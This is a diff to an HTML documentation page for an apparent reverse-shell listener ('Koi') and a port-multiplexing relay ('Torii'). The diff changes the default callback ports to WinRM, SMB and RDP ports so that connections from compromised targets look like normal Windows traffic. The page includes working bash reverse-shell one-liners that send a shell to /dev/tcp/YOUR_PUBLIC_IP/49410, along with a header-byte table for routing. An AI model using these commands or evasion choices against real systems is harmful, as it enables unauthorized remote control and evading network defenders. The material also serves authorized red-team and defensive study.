@@ -1310,10 +1310,10 @@
 <p>Check your Koi config to see which ports:</p>
 <div class="highlight"><pre><span></span><code>cat<span class="w"> </span>~/.koi/config.json<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-A<span class="w"> </span><span class="m">10</span><span class="w"> </span>sidetcps
 </code></pre></div>
-<p>By default that's ports 4011-4015, but it can be more or different depending on your config.</p>
+<p>By default that's <code>[5985, 5986, 445, 3389]</code>, but it can be different depending on your config. Those are WinRM, SMB and RDP ports, picked so a target dialing back looks like normal Windows traffic instead of a random high port.</p>
 <p>When you go remote or deploy on a VPS, you have a problem. You'd need to open firewall rules for:
 - Port 4010 for the reverse shell
-- Ports 4011-4015 for side-channels (or whatever your config says)</p>
+- Ports 5985, 5986, 445 and 3389 for side-channels (or whatever your config says)</p>
 <p>Your options suck:
 - Open all those ports individually (obvious what it is)
 - Dynamically update firewall rules (too complex)
@@ -1325,7 +1325,7 @@
 <div class="highlight"><pre><span></span><code>[TYPE byte][PORT in big-endian]
 
 0x01 0x0F 0xAA = reverse shell to Koi:4010
-0x02 0x0F 0xAB = side-channel to Koi:4011
+0x02 0x17 0x61 = side-channel to Koi:5985
 </code></pre></div>
 <p>When Koi needs to send a file transfer command, it tells the target to connect back. Torii intercepts that and rewrites the localhost address to your public IP, then routes it to the right internal port. The target has no idea it's being multiplexed.</p>
 <p>Result: everything flows through one port instead of many.</p>
@@ -1335,7 +1335,7 @@
 <p>If you're already pivoted inside, Koi works fine without Torii. But you could still use it for centralization, easier deployment, or just for practice.</p>
 <h3 id="remote-target-recommended">Remote Target (Recommended)</h3>
 <p>Target is outside your network. Instead of opening multiple firewall holes:</p>
-<div class="highlight"><pre><span></span><code>Without Torii: port 4010, then 4011, 4012, 4013, 4014, 4015
+<div class="highlight"><pre><span></span><code>Without Torii: port 4010, then 5985, 5986, 445, 3389
 With Torii:    port 49410 only
 </code></pre></div>
 <p>One firewall rule. Done.</p>
@@ -1370,7 +1370,7 @@ koi<span class="w"> </span>--listen<span class="w"> </span><span class="m">127</
 <h3 id="1-check-your-koi-side-channel-ports">1. Check your Koi side-channel ports</h3>
 <div class="highlight"><pre><span></span><code>cat<span class="w"> </span>~/.koi/config.json<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-A<span class="w"> </span><span class="m">10</span><span class="w"> </span>sidetcps
 </code></pre></div>
-<p>You'll see a list like <code>[4011, 4012, 4013, 4014, 4015]</code>. You need to know these for calculating Torii headers.</p>
+<p>You'll see a list like <code>[5985, 5986, 445, 3389]</code>. You need to know these for calculating Torii headers.</p>
 <h3 id="2-deploy-torii-on-your-vps-or-relay-machine">2. Deploy Torii on your VPS or relay machine</h3>
 <div class="highlight"><pre><span></span><code>python3<span class="w"> </span>torii_standalone.py<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>--listen<span class="w"> </span><span class="m">0</span>.0.0.0:49410<span class="w"> </span><span class="se">\</span>
@@ -1393,11 +1393,48 @@ bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;<
 <div class="highlight"><pre><span></span><code><span class="o">(</span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;\x01\x0f\xaa&#39;</span><span class="p">;</span><span class="w"> </span>bash<span class="w"> </span>-i<span class="o">)</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/YOUR_PUBLIC_IP/49410<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
 </code></pre></div>
 <p>The <code>printf '\x01\x0f\xaa'</code> sends the header bytes. After that, everything else is normal bash reverse shell. When the target connects, Torii reads those three bytes, sees it's a shell connection to port 4010, and routes to Koi.</p>
-<p>If you need a different backend port (say, 4011 for a side-channel), calculate the header:</p>
-<div class="highlight"><pre><span></span><code><span class="c1"># Port 4011 in hex = 0x0F 0xAB</span>
+<p>If you need a different backend port (say, 5985 for a side-channel), calculate the header:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Port 5985 in hex = 0x17 0x61</span>
 <span class="c1"># Type 0x02 = side-channel</span>
-<span class="o">(</span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;\x02\x0f\xab&#39;</span><span class="p">;</span><span class="w"> </span>your_payload_here<span class="o">)</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/YOUR_PUBLIC_IP/49410<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+<span class="o">(</span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;\x02\x17\x61&#39;</span><span class="p">;</span><span class="w"> </span>your_payload_here<span class="o">)</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/YOUR_PUBLIC_IP/49410<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
 </code></pre></div>
+<p>The other defaults, for reference:</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Bytes</th>
+<th>Normally</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>4010</code></td>
+<td><code>0x0F 0xAA</code></td>
+<td>Koi listener (type <code>0x01</code>)</td>
+</tr>
+<tr>
+<td><code>5985</code></td>
+<td><code>0x17 0x61</code></td>
+<td>WinRM HTTP</td>
+</tr>
+<tr>
+<td><code>5986</code></td>
+<td><code>0x17 0x62</code></td>
+<td>WinRM HTTPS</td>
+</tr>
+<tr>
+<td><code>445</code></td>
+<td><code>0x01 0xBD</code></td>
+<td>SMB</td>
+</tr>
+<tr>
+<td><code>3389</code></td>
+<td><code>0x0D 0x3D</code></td>
+<td>RDP</td>
+</tr>
+</tbody>
+</table>
 <p>That's all. Deploy the payload on the target, it connects through Torii, you get a session in Koi.</p>
 <h3 id="powershell">PowerShell</h3>
 <p>For Windows targets, PowerShell is trickier because you need to send raw bytes. Use a bash wrapper:</p>
